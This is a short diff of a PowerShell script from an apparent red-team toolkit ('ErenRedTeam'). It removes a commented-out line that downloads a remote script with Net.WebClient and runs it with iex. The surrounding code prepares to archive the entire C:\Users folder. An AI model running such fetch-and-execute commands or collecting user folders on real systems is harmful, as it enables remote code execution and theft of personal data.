@@ -23,8 +23,6 @@ Write-Host -Fore Gray "          https://github.com/dheenaxe/ErenRedTeam"
 Write-Host ""
 Write-Host ""
 
-# iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/dheenaxe/ErenRedTeam/refs/heads/main/peek.ps1')
-
 $outputArchive = "C:\eren\peek\UsersBackup.7z"
 $sourceFolder = "C:\Users"
 
